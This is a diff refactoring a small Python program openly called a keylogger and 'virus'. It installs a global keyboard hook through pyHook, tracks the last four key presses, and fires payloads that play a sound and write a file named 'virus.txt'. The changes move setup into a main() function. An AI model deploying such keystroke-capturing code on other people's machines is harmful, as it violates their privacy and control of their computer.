@@ -5,7 +5,6 @@ class Keylogger:
 #the list which stores key presses. For simplicity, it only cares about the 4 most recent presses
     def __init__(self):
         self.keyLog = [0, 0, 0, 0]
-        self.payloadFile('virus.txt')
 
     def payloadSound(self):
         playsound('cool.wav')
@@ -50,8 +49,14 @@ class Keylogger:
         return True
 
 #pyHook and pythoncom functions that catches when the user does something, for us, a keyboard press
-hooks_manager = pyHook.HookManager()
-virus = Keylogger()
-hooks_manager.KeyDown = virus.keyboardEvent
-hooks_manager.HookKeyboard()
-pythoncom.PumpMessages()
+def main():
+    hooks_manager = pyHook.HookManager()
+    virus = Keylogger()
+    virus.payloadFile('virus.txt')
+    hooks_manager.KeyDown = virus.keyboardEvent
+    hooks_manager.HookKeyboard()
+    pythoncom.PumpMessages()
+
+
+if __name__ == '__main__':
+    main()
